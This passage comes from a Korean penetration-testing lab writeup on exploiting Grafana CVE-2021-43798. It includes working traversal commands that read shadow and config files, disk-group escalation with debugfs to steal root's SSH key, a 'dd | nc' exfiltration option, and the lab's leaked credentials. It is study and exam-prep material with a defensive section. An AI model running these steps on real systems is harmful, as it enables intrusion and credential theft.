**애플리케이션에서 얻은 자격증명은 항상 OS 계정으로 재사용을 시도한다.** 반대 방향(OS → 앱)도 마찬가지다. 관리자가 같은 비밀번호를 돌려쓰는 것은 규칙에 가깝다.

> [!danger] ⚠️ 시험 금지 도구 관점 — 이 박스에는 해당 사항이 거의 없다
> CVE-2021-43798에는 Metasploit 모듈(`auxiliary/scanner/http/grafana_plugin_traversal` 계열)과 공개 자동화 PoC 스크립트가 여럿 있다. 시험에서 Metasploit은 **한 대에만** 쓸 수 있으므로, 이 정도로 단순한 취약점에 그 한 장을 소모하는 것은 손해다.
>
> **수동 대안 = 이 노트의 `curl` 한 줄이 전부다.** 자동화가 필요하면 셸 루프로 충분하다:
> ```bash
> for f in /etc/passwd /etc/grafana/grafana.ini /var/lib/grafana/grafana.db /etc/shadow; do
>   echo "=== $f"
>   curl -s --path-as-is "http://192.168.248.181:3000/public/plugins/alertlist/../../../../../../../..$f"
> done
> ```
> 나머지 도구(`sqlite3`·`python3`+pycryptodome·`ssh`·`debugfs`)는 **전부 허용**이다. `hashcat`/`john`도 허용이지만 2-7의 이유로 여기서는 쓸 필요가 없다.

셸을 잡자마자 칠 5개 — 여기서는 첫 줄에서 끝났다.
```bash
id                                   # ← 보조 그룹에 disk. 여기서 종료
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
```
**`id`를 먼저 치는 이유가 이 박스에 그대로 있다.** 순서를 바꿔 SUID 탐색부터 했다면 출력이 수십 줄 쏟아지고 그 안에서 답을 찾느라 시간을 썼을 것이다.

---

## 4. 권한상승 — `disk` 그룹 + debugfs

### 4-1. 왜 `disk` 그룹이 root와 같은가

`disk` 그룹은 **블록 디바이스(`/dev/sda*`)를 직접 읽을 권한**을 준다. 파일시스템 권한(`/root` 0700)은 커널이 경로를 통해 접근할 때만 적용되므로, **디바이스를 직접 읽으면 우회된다.**

이 문장을 계층으로 풀면 왜 그런지가 분명해진다:

```
[경로로 접근]  open("/root/.ssh/id_rsa")
                 └→ VFS  →  권한 검사(0700, uid 0)  →  ext4 드라이버  →  블록 장치  →  디스크
                              ↑ 여기서 EACCES

[디바이스로 접근]  open("/dev/sda2")
                 └→ VFS  →  권한 검사(0660 root:disk, 나는 disk 그룹)  →  ✅ 통과  →  디스크 원본 바이트
                              ↑ 여기만 통과하면 그 뒤에 파일 권한이라는 개념이 없다
```

> [!danger] 파일 권한은 **경로를 통한 접근에만** 적용된다
> `/root` 0700은 "커널에게 경로로 물어봤을 때" 거부하라는 표시일 뿐이다. **디스크의 원본 바이트에는 그런 표시가 붙어 있지 않다.**
> 파일 권한(퍼미션 비트)은 ext4 inode 안에 데이터로 적혀 있고, 그 데이터를 해석해서 강제하는 것은 커널의 VFS 계층이다. 디바이스를 직접 읽으면 **강제하는 주체를 건너뛰고 데이터만 가져오는 것**이다.
>
> 같은 논리가 이 그룹들에 전부 적용된다:
> | 그룹 | 무엇을 직접 만지는가 | 결과 |
> |---|---|---|
> | `disk` | 블록 디바이스 | **전체 파일시스템 읽기/쓰기 = root** |
> | `docker` | 도커 소켓 | 호스트 `/`를 마운트한 컨테이너 실행 = root |
> | `lxd` | LXD 소켓 | 위와 동일 |
> | `shadow` | `/etc/shadow` | 해시 획득 → 크랙 |
> | `adm` | `/var/log` | 로그 안의 자격증명 |
> | `video` | 프레임버퍼 | 화면 캡처 |
>
> **`id` 출력의 보조 그룹은 한 줄씩 소리내어 읽어라.**

### 4-2. `debugfs`가 무엇인가

`debugfs`는 **마운트를 거치지 않고 ext2/3/4 파일시스템의 구조를 직접 파싱하는 도구**다(e2fsprogs 패키지). 슈퍼블록을 읽고, inode 테이블을 따라가고, 디렉터리 엔트리를 해석해서 파일 내용을 꺼낸다 — 커널의 VFS를 전혀 거치지 않는다.

즉 `disk` 그룹이 준 "원본 바이트 읽기" 능력을 **사람이 쓸 수 있는 파일 인터페이스로 번역**해 주는 도구다. 이 둘의 조합이 권한상승의 실체다.

```
disk 그룹  →  /dev/sda2 의 원본 바이트    (읽을 수는 있지만 해석 불가)
              +
debugfs    →  ext4 구조 파싱             (해석해서 파일로 보여줌)
              =
              /root 안의 무엇이든 읽기
```

### 4-3. 디바이스를 먼저 확인한다

```bash
sysadmin@fanatastic:~$ df -h /
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2       9.8G  5.6G  3.7G  61% /
```

> [!warning] 디바이스 이름을 넘겨짚지 마라
> 흔한 writeup들은 `/dev/sda1`이라고 적지만 이 박스는 **`/dev/sda2`**다.
> `df -h /` 로 **실제 루트 파티션을 먼저 확인**한다. 틀린 디바이스에 `debugfs`를 걸면 엉뚱한 결과가 나오거나 실패한다.
>
> `/dev/sda1`이 무엇인지도 알아두면 이해가 빨라진다 — UEFI 부팅 시스템에서 1번은 **EFI 시스템 파티션(FAT32)** 인 경우가 많다. ext4가 아니므로 `debugfs`가 열지 못하고, 열려도 `/root`가 없다. 결과는 "실패" 또는 "빈 결과"이고, 사람은 그걸 보고 "disk 그룹으로는 안 되나 보다" 라는 잘못된 결론에 도달한다.
>
> 확인 명령 3종:
> ```bash
> df -h /                 # 루트가 어느 디바이스인가  ← 가장 직접적
> lsblk                   # 전체 블록 디바이스 트리
> cat /proc/partitions    # lsblk 가 없을 때
> ls -l /dev/sd*          # 내 그룹으로 읽을 수 있는지 퍼미션 확인
> ```

### 4-4. 개인키 탈취

```bash
sysadmin@fanatastic:~$ debugfs -R "ls -l /root/.ssh" /dev/sda2
 534659  100600 (1)      0      0     565  4-Feb-2022 09:20 authorized_keys
 534576  100600 (1)      0      0    2590  4-Feb-2022 09:20 id_rsa
 541822  100644 (1)      0      0     565  4-Feb-2022 09:20 id_rsa.pub

sysadmin@fanatastic:~$ debugfs -R "cat /root/.ssh/id_rsa" /dev/sda2 > /tmp/root_id_rsa
```

`authorized_keys`(565B)와 `id_rsa.pub`(565B)의 **크기가 같다** — 자기 공개키가 등록돼 있다는 뜻이라 그 개인키로 로그인이 된다는 예측이 선다.

`ls -l` 출력을 읽는 법. `debugfs`의 출력은 셸 `ls`와 다르다. 열 순서는 **inode 번호 · 모드(8진) · 링크수 · uid · gid · 크기 · 시각 · 이름**이다.
- `100600` = 정규파일(`10`) + `0600` 퍼미션
- `0  0` = uid 0, gid 0 → **root 소유 확정**
- **크기 비교로 관계를 추론**하는 것이 여기의 핵심 기술이다. 565 = 565이므로 `authorized_keys`에 자기 공개키가 들어 있을 가능성이 매우 높고, 그렇다면 `id_rsa`로 자기 자신에게 SSH가 된다.

크기가 달랐다면? 그때는 `debugfs -R "cat /root/.ssh/authorized_keys"`로 내용을 직접 확인하고, 그래도 안 맞으면 **키를 훔치는 대신 `/root/proof.txt`를 그냥 읽는 것**이 더 빠르다(4-6 참조).

> [!danger] `debugfs`는 반드시 읽기 전용으로
> `-w` 플래그는 쓰기 모드다. 마운트된 파일시스템에 쓰기를 걸면 손상시킬 수 있다.
> `-R "명령"` 형태의 **단발 실행**이 안전하고 자동화에도 편하다(대화형 셸을 tmux로 붙들 필요가 없다).
>
> | 플래그 | 의미 | 위험도 |
> |---|---|---|
> | `-R "cmd"` | 명령 하나 실행 후 종료 | 안전. **기본으로 쓴다** |
> | (없음) | 대화형 셸 | 안전하지만 자동화 불가 |
> | `-w` | 쓰기 가능하게 열기 | ⚠️ 마운트된 fs에 쓰면 **커널 캐시와 불일치** → 파일시스템 손상·데이터 유실 |
>
> 마운트된 파일시스템은 커널이 페이지 캐시를 들고 있다. 그 밑에서 `debugfs -w`로 디스크를 고치면 커널은 그 사실을 모르고, 나중에 캐시를 플러시하며 **내 수정을 덮어쓰거나 메타데이터를 깨뜨린다.**
> **시험에서 타겟 파일시스템을 깨면 리버트 말고는 답이 없다.** 읽기로 끝낼 수 있으면 절대 쓰지 마라.

```bash
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ chmod 600 root_id_rsa
┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ ssh-keygen -y -f root_id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPUv+tt4lwk5zlPguml2nS... root@ubuntu

┌──(kali㉿kali)-[~/PG/Fanatastic]
└─$ ssh -i root_id_rsa root@192.168.248.181
root@fanatastic:~# id
uid=0(root) gid=0(root) groups=0(root)
root@fanatastic:~# cat proof.txt
a0e3b952a1332b4b36bfb009b2747ded
```

왜 `chmod 600`과 `ssh-keygen -y`를 거치는가.
- `chmod 600` — OpenSSH는 개인키 파일이 그룹/타인에게 읽히면 **키를 아예 무시하고** `UNPROTECTED PRIVATE KEY FILE!` 로 거부한다. 리눅스에서 파일을 옮기면 퍼미션이 헐거워지는 일이 잦으므로 반사적으로 친다.
- `ssh-keygen -y -f` — 개인키에서 공개키를 재계산한다. 두 가지를 한 번에 확인한다:
  1. **키 파일이 온전한가** (전송 중 깨지지 않았는가)
  2. **키에 패스프레이즈가 걸려 있는가** (걸려 있으면 여기서 물어본다)

  출력 끝의 코멘트 `root@ubuntu`도 정보다 — 이 키가 root용으로 생성됐다는 뜻이다.

이 두 줄이 "SSH가 안 붙는다"의 원인을 접속 전에 걸러준다. 접속 실패 후 원인을 찾는 것보다 훨씬 싸다.

### 4-5. 대안 경로 — 하나가 막혔을 때

이 박스는 첫 경로로 끝났지만, `disk` 그룹이 있으면 길은 여럿이다. 우열을 비교해 둔다.

| 방법 | 명령 | 평가 |
|---|---|---|
| **개인키 탈취** (채택) | `debugfs -R "cat /root/.ssh/id_rsa" /dev/sda2` | 최선. 안정적인 root 셸을 얻는다. 재부팅 후에도 재현 가능 |
| 플래그만 직접 읽기 | `debugfs -R "cat /root/proof.txt" /dev/sda2` | 가장 빠르다. 단 **셸이 아니라 파일 하나**뿐이라 시험 증거 요건(`whoami`가 root)을 못 채울 수 있다 |
| `/etc/shadow` 읽고 크랙 | `debugfs -R "cat /etc/shadow" /dev/sda2` | 해시를 얻어도 크랙은 확률 게임. **2-7의 교훈이 여기서도 적용** |
| 원본 디바이스 grep | `grep -a -m1 -C2 'BEGIN OPENSSH' /dev/sda2` | 파일시스템 구조를 몰라도 되지만 **10GB를 훑어야** 하고 삭제된 데이터의 잔해까지 섞인다. `debugfs`가 있으면 쓸 이유가 없다 |
| `authorized_keys`에 내 키 추가 | `debugfs -w -R "..."` | ⚠️ **쓰기 모드 필요 → 파일시스템 손상 위험.** 읽기로 목적을 달성할 수 있으므로 하지 마라 |
| 디스크 이미지 통째 복사 | `dd if=/dev/sda2 of=... ` | 10GB 전송. 랩에서는 시간 낭비, 실전에서는 탐지 신호 |

우선순위 규칙. **읽기로 끝나는 방법 > 쓰기가 필요한 방법**, **셸을 주는 방법 > 파일 하나를 주는 방법.**
이 두 축으로 정렬하면 `debugfs -R "cat /root/.ssh/id_rsa"`가 자동으로 1순위가 된다.

---

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/sysadmin/local.txt` | `de1e53adbb59aa276d386e13838cb680` |
| `proof.txt` | `/root/proof.txt` | `a0e3b952a1332b4b36bfb009b2747ded` |

둘 다 **표준 위치**다 — 사용자 홈과 `/root`.

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그 단독 캡처가 인정되지 않는다. 아래를 **한 화면에** 담아야 한다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스라면 `root` / `fanatastic` / `192.168.248.181` / 플래그가 한 화면에 나온다.
> **랩에서부터 이 습관을 들여라.** 시험장에서 다시 붙어 캡처하는 것은 종종 불가능하다(리버트·시간 초과).

---

## 6. 막혔던 지점 / 시행착오

### ① `--path-as-is` — 실제로 겪은 최대 함정

**증상**: 페이로드가 완벽한데 404. 서버 로그에도 흔적이 남지 않는다.
**원인**: curl이 요청을 보내기 전에 `../`를 정규화해 `/etc/passwd`로 축약해버렸다.
**알아챈 법**: "내가 보낸 요청이 정말 그 모양인가"를 의심한 것. `curl -v`로 요청 라인을 보면 축약된 경로가 그대로 찍힌다.

```
> GET /etc/passwd HTTP/1.1        ← 내가 친 것과 다르다
```

> [!danger] 이 함정이 특히 나쁜 이유
> **실패 신호가 "정상 응답"의 모습을 하고 있다.** 404는 "그 파일이 없다"는 지극히 평범한 응답이라, 사람은 자연스럽게 타겟이 안전하다고 결론짓는다.
> 실제로는 취약점도 페이로드도 멀쩡하고 내 클라이언트만 잘못이었다.
>
> 일반화: **"응답이 실패를 뜻하지 않는다"의 쌍둥이 명제 — 실패 응답이 취약하지 않음을 뜻하지도 않는다.**
> 이 패턴은 [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]]에 누적 중인 "응답이 성공을 뜻하지 않는다"와 같은 뿌리다.
>
> 반사 규칙: 트래버설이 404를 뱉으면 순서대로 확인한다.
> 1. `curl -v`로 **실제 전송된 요청 라인** 확인 → 축약됐으면 `--path-as-is`
> 2. `../` 개수를 8~12로 늘림
> 3. 플러그인 ID / 경로 세그먼트를 실측값으로 교체
> 4. 인코딩 변형 사다리 (2-4)
> 5. 생 소켓(`printf | nc`)으로 최종 확인
>
> **1번을 건너뛰고 2~5번을 돌면 영원히 안 된다.**

### ② `secret_key`가 주석 처리돼 있어 "없다"고 오판할 뻔했다

**증상**: `grep secret_key grafana.ini` 결과 세 줄이 전부 `;`로 시작하거나 값이 비어 있다.
**오판 경로**: "키가 설정 파일에 없다 → 환경변수나 다른 곳에 있겠지 → `/proc/self/environ`, systemd 유닛 파일, 도커 컴포즈 파일을 뒤진다" — 여기서 시간이 대량으로 소모된다.
**정답**: 주석 처리 = 기본값 적용 = 주석 안의 값이 실사용값.

**어떻게 확증했는가**: 추론으로 확신한 게 아니라 일단 넣고 복호화를 돌려봤다. 평문이 `SuperSecureP@ssw0rd`라는 읽히는 문자열로 나온 것이 사후 증명이다.

> [!tip] 여기서 얻는 작업 규칙
> **"맞는지 모르겠는 후보값은 논쟁하지 말고 넣어봐라."** 복호화 시도는 1초면 끝나고, 결과가 읽히는 평문이면 그 자체가 증명이다.
> 반대로 "이게 맞을까"를 30분 고민하는 것은 순수한 손실이다. **검증 비용이 싼 가설은 즉시 실행으로 판정한다.**

### ③ `/dev/sda1`이라고 적힌 참고 자료 — 넘겨짚기의 대가

**증상**: 다른 writeup을 그대로 따라 `debugfs -R "..." /dev/sda1`을 치면 실패하거나 엉뚱한 결과.
원인: 이 박스의 루트 파티션은 **`/dev/sda2`**다.
**해결**: `df -h /` 한 줄.

> [!warning] "참고 자료의 상수를 그대로 베끼지 마라"
> IP·포트·경로·디바이스 이름·사용자명은 환경마다 다른 변수다. writeup에서 가져올 것은 **절차**이지 상수가 아니다.
> 시험장에서 이 실수는 특히 위험하다 — 기법 자체는 맞는데 상수가 틀려서 실패하면, 사람은 **기법을 버리고 다른 길을 찾기 시작한다.** 옳은 길을 스스로 폐기하는 것이 가장 비싼 오류다.

### ④ 바이너리 파일을 HTTP로 받을 때의 손상 위험

`grafana.db`는 SQLite 바이너리다. `-o`로 저장하고 `file`로 검증하는 절차를 지켰기에 문제가 없었지만, 이 검증을 건너뛰면 **몇 단계 뒤에나 문제를 발견**하게 된다.

```
잘못된 순서:  curl (검증 없음) → sqlite3 → "file is not a database" → 원인 추적
올바른 순서:  curl -o → file → sqlite3
```

`file` 출력의 `database pages 187`은 "내용이 실제로 들어 있다"까지 알려준다. 0페이지짜리 빈 DB를 받았다면 여기서 즉시 잡힌다.

### ⑤ 이 유형에서 흔히 막히는 지점 (원문에 실측 기록 없음 — 일반 지식) [가정]

아래는 이 박스의 실제 시행착오 기록이 아니라, **같은 유형을 다룰 때 반복적으로 발생하는 실패 지점**을 정리한 것이다. 구분해서 읽어라.

**(a) CFB 세그먼트 크기 불일치**
pycryptodome의 `AES.MODE_CFB` 기본값은 CFB8인데 Go는 CFB128이다. `segment_size=128`을 빼면 **첫 바이트만 맞고 뒤가 깨진다.** 증상이 "키가 거의 맞는 것처럼" 보여서 키를 의심하게 만드는 것이 고약하다.
→ 판정법: 평문 앞 1~2바이트만 말이 되면 키가 아니라 **모드 파라미터**를 의심하라.

**(b) `secure_json_data`가 JSON 안에 들어 있다**
DB 컬럼 값은 `{"basicAuthPassword":"..."}` 형태다. **JSON을 파싱하지 않고 컬럼 전체를 base64 디코딩하려 하면** 당연히 실패한다. 값 부분만 꺼내야 한다.

**(c) Grafana 9 이상은 포맷이 다르다**
9.x부터 엔벨로프 암호화(envelope encryption)가 기본이 되어 `secret_key` → **데이터 키** → 데이터의 2단 구조가 된다. 암호문 앞에 `#`로 감싼 키 이름이 붙는다.
→ **버전을 먼저 확인하고 포맷을 고르라.** 8.x 스크립트를 9.x에 돌리면 조용히 쓰레기가 나온다.

**(d) 플러그인 ID 추측 실패**
`alertlist`가 통하지 않는 버전/설치본이 있다. 404를 받고 "패치됨"으로 결론짓기 쉽다.
→ `/metrics`의 `grafana_plugin_build_info`, 또는 로그인 페이지가 로드하는 JS에서 실제 플러그인 경로를 관찰한다.

**(e) `debugfs`가 타겟에 없는 경우**
e2fsprogs가 최소 설치에서 빠져 있을 수 있다.
→ 대안: `dd if=/dev/sda2 bs=1M | nc`로 칼리에 넘겨 로컬에서 `debugfs`/마운트, 또는 `grep -a`로 디바이스에서 직접 키 문자열 검색.

### ⑥ 시간 배분 — 어디서 손절했어야 하는가

[가정] 아래 배분은 실제 측정치가 아니라 이 경로를 재현할 때의 합리적 기준이다.

| 단계 | 목표 시간 | 손절선 |
|---|---|---|
| 정찰 (nmap + 3000·9090 열거) | 10분 | 20분 넘으면 열거를 멈추고 **버전 CVE 검색으로 전환** |
| 버전 판정 → CVE 매칭 | 5분 | Grafana 8.3.0을 확인한 순간 **다른 경로 탐색은 전부 중단**한다 |
| 트래버설 성립 확인 (`/etc/passwd`) | 10분 | **404가 나와도 30분 이상 붙잡지 마라.** 대신 6-①의 체크리스트를 순서대로 |
| 설정·DB 탈취 | 5분 | — |
| 복호화 | 20분 | 40분 넘으면 **admin 해시 크랙이 아니라 포맷/모드를 다시 확인** |
| SSH + `id` | 2분 | — |
| privesc | 10분 | `id`에 `disk`가 보였으면 **다른 열거는 하지 마라** |

> [!danger] 이 박스에서 시간을 태우는 두 개의 블랙홀
> 1. **`user` 테이블의 admin 해시 크랙** — 절대 하지 마라. 가역 암호문이 바로 옆에 있다(2-7).
> 2. **9090 Prometheus 파고들기** — 완전 비인증이라 매력적으로 보이지만 관리 API가 꺼져 있어 길이 없다. `web.enable-admin-api=false`를 확인한 순간 접는다.
>
> 두 곳 다 "그럴듯해 보인다"는 것이 위험의 근원이다. **매력적인 막다른 길이 명백한 막다른 길보다 비싸다.**

---

## 7. OSCP 시험 관점

1. **모니터링 스택은 `/metrics`부터 본다.** Grafana의 `/metrics`가 비인증으로 버전·설치된 플러그인 ID·계정 수를 전부 내줬다. 플러그인 ID는 CVE-2021-43798 페이로드의 필수 입력값이라, 추측 대신 정확한 값을 얻었다. `grafana_stat_total_users 1`은 "브루트포스 무의미"까지 알려준다.
2. **비인증 버전 엔드포인트를 제품별로 외워라.** Grafana `/api/health`, Prometheus `/api/v1/status/buildinfo`, Nextcloud `/status.php`. 버전 판정이 5분에서 30초로 줄어든다. 판정은 항상 독립 근거 2개로 교차.
3. **⚠️ `--path-as-is`를 빼면 트래버설이 성립하지 않는다.** curl이 클라이언트 측에서 `../`를 정규화해버려 서버에 도달조차 못 한다. 트래버설이 404면 `curl -v`로 실제 전송된 요청 라인부터 본다. `wget`도 같은 문제가 있고, Burp Repeater와 생 소켓은 원문을 그대로 보낸다.
4. **`../`는 넉넉히(8~12개) 넣어라.** 루트에서 `..`는 무해하다. 깊이 계산은 시간 낭비다.
5. **설정 파일의 주석 처리된 값은 "이게 기본값"이라는 문서다.** `;secret_key = SW2YcwTIb9zpOOhoPsMm`이 비활성이라고 버리면 안 된다 — 주석이 곧 실제 사용값이었다. `grep`에서 주석 줄을 필터링해 버리지 마라.
6. **해시보다 가역 암호화를 먼저 노려라.** `user.password`는 크랙해야 하지만 `data_source`의 비밀번호는 키만 있으면 100% 복원된다. 고정 길이 hex = 해시(후순위), 가변 길이 base64 = 암호문(선순위).
7. **애플리케이션 암호화 포맷은 `salt || IV || ciphertext`가 사실상 표준이다.** salt와 IV는 비밀이 아니므로 암호문에 붙어 온다. 공격자에게 부족한 것은 마스터 키 하나뿐이며, 그건 대개 설정 파일에 있다.
8. **복호화가 "거의 맞는" 결과를 내면 키가 아니라 모드 파라미터를 의심하라.** Go의 CFB는 128비트 세그먼트, pycryptodome 기본은 8비트다.
9. **DB의 사용자명이 OS 계정명과 같으면 재사용을 의심한다.** `basic_auth_user = sysadmin` ↔ `/etc/passwd`의 `sysadmin`. `/etc/passwd`에서 셸이 있는 계정만 SSH 후보다.
10. **`id` 출력의 보조 그룹을 반드시 읽어라.** `disk`·`docker`·`lxd`·`adm`·`shadow`·`video`는 전부 권한상승 벡터다. 여기서는 `6(disk)` 하나가 root로 직결됐다. 셸을 잡으면 `id`가 항상 첫 줄이다.
11. **`disk` 그룹은 파일 권한을 우회한다.** `/root` 0700은 커널이 경로로 접근할 때의 통제일 뿐, 블록 디바이스를 직접 읽으면 무의미하다. `debugfs -R "cat <경로>" <디바이스>`.
12. **디바이스 이름을 넘겨짚지 말고 `df -h /`로 확인한다.** 이 박스는 `/dev/sda1`이 아니라 `/dev/sda2`였다. UEFI 시스템의 `sda1`은 대개 FAT32 EFI 파티션이라 `debugfs`로 열리지 않는다.
13. **`debugfs`는 `-R`(단발·읽기 전용)로만 쓴다.** `-w`는 마운트된 파일시스템을 손상시킬 수 있고, 시험에서 타겟을 깨면 리버트밖에 답이 없다.
14. **개인키를 얻으면 `chmod 600` → `ssh-keygen -y -f` → 접속.** 퍼미션과 무결성을 접속 전에 검증하면 실패 원인 추적 시간이 사라진다.
15. **바이너리를 HTTP로 받으면 `-o` 저장 + `file`/해시 검증.** SQLite DB가 텍스트로 깨지면 이후가 전부 무너지는데, 그 사실은 몇 단계 뒤에나 드러난다.
16. **⚠️ 자동 도구 대비 — 이 경로의 수동 대안은 이미 전부 수동이다.** CVE-2021-43798에는 Metasploit 모듈과 자동 PoC 스크립트가 있지만, `curl` 한 줄 + `for` 루프로 완전히 대체된다. Metasploit 1회 사용권을 이런 데 쓰지 마라.
17. **매력적인 막다른 길을 조기에 접어라.** 비인증 Prometheus(9090)는 관리 API가 꺼져 있어 길이 없었고, admin 해시 크랙은 옆에 가역 암호문이 있었다. "들어갈 수 있다"와 "쓸모가 있다"는 다르다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| **CVE-2021-43798 (경로 트래버설)** | 8.3.1 이상으로 업그레이드. 근본 수정은 경로 조립 후 "기준 디렉터리 하위인지" 검사를 추가하는 것 — `filepath.Join`/`Clean`은 보안 경계가 아니다 |
| Grafana가 인터넷/사설망에 **직접 노출** | 리버스 프록시 뒤에 두고 SSO·IP 화이트리스트 적용. 관리 UI는 VPN 내부로 |
| **`/metrics`가 비인증 공개** | `[metrics] basic_auth_username/password` 설정 또는 프록시에서 `/metrics` 차단. 버전·플러그인·계정 수는 전부 정찰 정보다 |
| **`/api/health`가 정확한 버전·커밋 노출** | 프록시에서 응답을 축약하거나 접근 제한. 최소한 패치 지연을 없애야 노출이 무해해진다 |
| **`secret_key`가 기본값** | 설치 직후 반드시 변경. 기본값은 공개 문서에 적힌 값이라 사실상 키가 없는 것과 같다. Grafana 9+ 라면 엔벨로프 암호화 + 외부 KMS 사용 |
| 데이터소스 자격증명이 **DB에 가역 저장** | 구조상 불가피(연결에 원문이 필요). 따라서 `grafana.db` 파일 접근 통제와 키 관리가 유일한 방어선이다. 파일 권한 0600 + 서비스 계정 전용 |
| **데이터소스 비밀번호 = OS 계정 비밀번호** | 자격증명 재사용 금지. 데이터소스 인증은 전용 서비스 계정으로, OS 로그인 불가(`/usr/sbin/nologin`)하게 |
| **`sysadmin`이 `disk` 그룹 소속** | 즉시 제거. `disk`는 사실상 root 권한이다. 디스크 진단이 필요하면 `sudo`로 특정 명령만 위임 |
| Prometheus 비인증 노출(9090) | 관리 API가 꺼져 있어도 **메트릭 자체가 내부 구조 정보**다. 인증 프록시 뒤로 |
| `/debug/pprof/` 공개 | 프로덕션 빌드에서 pprof 핸들러 제거 또는 별도 관리 포트/루프백 바인딩 |
| root의 `authorized_keys`에 자기 공개키 등록 | 불필요한 자기 참조 키 제거. root SSH 로그인은 `PermitRootLogin prohibit-password` 이상으로 제한하고, 가능하면 `no` |
| 탐지 | 웹 로그에서 `/public/plugins/*/..` 패턴 경보. `debugfs`·`dd`의 `/dev/sd*` 접근을 auditd로 기록 |

---

## 9. 참고 자료

- **CVE-2021-43798** — Grafana 8.0.0-beta1 ~ 8.3.0 경로 트래버설. 8.3.1에서 수정(8.0.7 / 8.1.8 / 8.2.7 백포트)
  - NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-43798
  - Grafana 보안 공지: https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
- **CWE-22** Path Traversal: https://cwe.mitre.org/data/definitions/22.html
- Go `filepath.Join`/`Clean` 문서 — **경로 정규화이지 보안 검사가 아니다**: https://pkg.go.dev/path/filepath
- Grafana 설정 레퍼런스(`secret_key` 기본값·`[metrics]` 인증): https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/
- PBKDF2 (RFC 8018) / AES-CFB (NIST SP 800-38A)
- pycryptodome CFB `segment_size`: https://pycryptodome.readthedocs.io/en/latest/src/cipher/classic.html#cfb-mode
- `debugfs(8)` — e2fsprogs: https://man7.org/linux/man-pages/man8/debugfs.8.html
- GTFOBins — `debugfs`: https://gtfobins.github.io/gtfobins/debugfs/
- HackTricks — 리눅스 권한상승, **`disk` 그룹** 항목

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `/tmp/root_id_rsa` (탈취한 root 개인키 사본) | 타겟에 남아 있음 — 랩 Stop/Revert로 소멸 |
| 로컬 `grafana.ini` · `grafana.db` · `root_id_rsa` | 칼리에 보관 |
| 타겟 파일시스템 변경 | **없음** — `debugfs`를 읽기 전용(`-R`)으로만 사용 |

획득 자격증명: `sysadmin` / `SuperSecureP@ssw0rd` (SSH·Grafana 데이터소스), root SSH 개인키.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[01. Pentest Foundations]] — Fanatastic 항목
- [[Crane]] — 비인증 버전 엔드포인트(`get_server_info`)로 버전 특정한 사례
- [[Levram]] — `id`의 그룹/capability를 읽어 privesc한 사례
- [[Hawat]] — "도구가 페이로드를 망가뜨린다"의 동류(인용 중첩 → hex 리터럴), 소스 기반 분석
- [[Hub]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] · [[Exghost]] — 같은 컬렉션
